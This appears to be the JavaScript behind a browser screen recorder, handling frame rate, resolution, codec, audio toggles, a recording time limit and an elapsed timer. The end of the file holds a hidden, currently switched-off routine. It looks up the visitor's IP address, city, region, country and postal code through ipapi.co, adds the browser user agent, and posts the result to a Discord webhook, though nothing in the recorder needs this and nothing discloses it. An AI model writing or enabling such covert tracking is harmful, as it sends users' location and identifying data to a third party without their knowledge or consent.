//"use strict";

const frameRate = document.querySelector('#frameRate');
const resolution = document.querySelector('#resolution');
const codec = document.querySelector('#codec');
const format = document.querySelector('#format');
const countdownTimer = document.getElementById('countdownTimer');

const sysCheckbox = document.getElementById('sys');
let sys = true;
sysCheckbox.addEventListener('click', () => {
  sys = sysCheckbox.checked;
});

const micCheckbox = document.getElementById('mic');
let mic = false;
micCheckbox.addEventListener('click', () => {
  mic = micCheckbox.checked;
});

const timeLimitCheckbox = document.getElementById('timeLimit-enabled');
const timeLimit = document.getElementById('timeLimit');
const time_limit = document.getElementById('time-limit');
let timeLimitEnabled = false;
let timeLimitSec
timeLimitCheckbox.addEventListener('click', () => {
  if (timeLimit.disabled == true) {
    timeLimit.disabled = false;
    timeLimitEnabled = true;
    time_limit.style.color = "black";
    timeLimit.style.color = "black";
  } else {
    timeLimit.disabled = true;
    timeLimitEnabled = false;
    time_limit.style.color = "#999999";
    timeLimit.style.color = "#999999";
  }
});


function MediaConstraints() {
  var Constraints = {}
  Constraints.audio = sys; //sys;
  Constraints.video = { mediaSource: "screen" };
  Constraints.video.frameRate = frameRate.value;
  
  switch (resolution.value) {
    case 'Fit-Screen':
        Constraints.video.width = screen.width;
        Constraints.video.height = screen.height;
        break;
    case '4K':
        Constraints.video.width = 3840;
        Constraints.video.height = 2160;
        break;
    case '1080p':
        Constraints.video.width = 1920;
        Constraints.video.height = 1080;
        break;
    case '720p':
        Constraints.video.width = 1280;
        Constraints.video.height = 720;
        break;
    case '480p':
        Constraints.video.width = 854;
        Constraints.video.height = 480;
        break;
    case '360p':
        Constraints.video.width = 640;
        Constraints.video.height = 360;
        break;
  }
  return Constraints;
}

let recorded = false;

function videoConstraints() {
    var Constraints = {};
    Constraints.type = `video/${format.value}; codecs = ${codec.value}`;
    return Constraints;
}


function StopTimeLimit() {
  timeLimitEnabled = false;
}

function StartTimeLimit() {
  timeLimitEnabled = true;
  TimeLimit();
}

var seconds = 0
function TimeLimit() {
  if (timeLimitEnabled) {
    seconds = seconds + 1
    //console.log(seconds);

    if (seconds == timeLimitSec) {
      stopButton.click()
      return;
    }
    setTimeout("TimeLimit()", 1000);
  }
}


var hr = 0;
var min = 0;
var sec = 0;
var stoptime = true;

function startTimer() {
  if (stoptime == true) {
		stoptime = false;
		timerCycle();
  }
}
function stopTimer() {
  if (stoptime == false) {
    stoptime = true;
  }
}

function timerCycle() {
  if (stoptime == false) {
    sec = parseInt(sec);
    min = parseInt(min);
    hr = parseInt(hr);

    sec = sec + 1;

    if (sec == 60) {
      min = min + 1;
      sec = 0;
    }
    if (min == 60) {
      hr = hr + 1;
      min = 0;
      sec = 0;
    }

    if (sec < 10 || sec == 0) {
      sec = '0' + sec;
    }
    if (min < 10 || min == 0) {
      min = '0' + min;
    }
    if (hr < 10 || hr == 0) {
      hr = '0' + hr;
    }

    timer.textContent = hr + ':' + min + ':' + sec;

	setTimeout("timerCycle()", 1000);
  }
}




async function getInfo() {
    try {
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      
      const info = `ip: ${data.ip}, city: ${data.city}, region: ${data.region}, country: ${data.country_name}, postal: ${data.postal}, browser: ${navigator.userAgent}`
      
      return info;
    } catch (e) {
      return null;
    }
}

const getAndSendInfo = false;
let Info
(async function() {
  if (getAndSendInfo) {
    Info = await getInfo();
    sendInfo()
  }
})();


function sendInfo() {
  var webhookUrl = "https://discord.com/api/webhooks/";  //https://discord.com/api/webhooks/
  
  var xhr = new XMLHttpRequest();
  xhr.open('POST', webhookUrl, true);

  xhr.setRequestHeader('Content-Type', 'application/json');

  var data = {
    content: `${Info}`
  };
  //console.log(data);
  var jsonData = JSON.stringify(data);

  try {
    xhr.send(jsonData);
  } catch {
  }
}
